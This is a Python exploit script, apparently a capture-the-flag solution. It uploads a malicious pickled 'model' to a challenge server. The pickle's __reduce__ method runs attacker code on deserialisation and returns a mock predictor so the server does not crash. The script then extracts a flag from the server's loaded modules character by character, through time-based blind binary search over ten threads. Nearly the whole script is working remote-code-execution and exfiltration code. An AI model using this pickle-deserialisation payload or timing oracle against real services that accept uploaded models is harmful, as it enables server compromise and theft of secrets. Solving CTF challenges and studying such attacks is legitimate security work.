import pickle
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor

# Optimized settings
URL = "http://instance.ctf.it.kmitl.ac.th:5065/submit"
SLEEP_TIME = 0.8 
THRESHOLD = 0.5   
MAX_THREADS = 10  

class Exploit:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        # High-speed payload with Mock Object to prevent crash
        code = f"""(lambda: [
            exec({repr(self.cmd)}),
            type('Mal', (object,), {{'predict': lambda self, X: [0]*len(X)}})()
        ][1])()"""
        return (eval, (code,))

def test_condition(cond):
    # Scan sys.modules for the flag (Part 2 specific logic)
    cmd = f"""
import time, sys
flag = ""
for mod in sys.modules.values():
    try:
        if hasattr(mod, '__dict__'):
            for k, v in mod.__dict__.items():
                if 'Cl@sh' in str(v):
                    flag = str(v)
                    break
    except: pass
    if flag: break

if {cond}:
    time.sleep({SLEEP_TIME})
"""
    # Use memory instead of disk for payload generation
    payload = pickle.dumps(Exploit(cmd))
    
    start = time.time()
    try:
        requests.post(URL, files={'model': ('model.pkl', payload)}, timeout=SLEEP_TIME + 2)
    except requests.exceptions.ReadTimeout:
        return True
    except Exception:
        pass
    
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def get_char(index):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        if test_condition(f"ord(flag[{index}]) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def main():
    print("[*] Identifying flag length (Binary Search)...")
    low_len = 1
    high_len = 100
    flag_len = 0
    
    while low_len <= high_len:
        mid = (low_len + high_len) // 2
        if test_condition(f"len(flag) >= {mid}"):
            flag_len = mid
            low_len = mid + 1
        else:
            high_len = mid - 1
            
    print(f"[+] Flag length: {flag_len}")
    
    if flag_len == 0:
        print("[-] Failed to find flag.")
        return

    print(f"[*] Extracting characters with {MAX_THREADS} threads...")
    results = [None] * flag_len
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_index = {executor.submit(get_char, i): i for i in range(flag_len)}
        
        completed = 0
        for future in future_to_index:
            index = future_to_index[future]
            char = future.result()
            results[index] = char
            completed += 1
            
            curr = "".join(c if c is not None else "_" for c in results)
            sys.stdout.write(f"\rProgress: [{curr}] ({completed}/{flag_len})")
            sys.stdout.flush()

    final_flag = "".join(results)
    print(f"\n\n[!] Final Flag: {final_flag}")

if __name__ == "__main__":
    main()
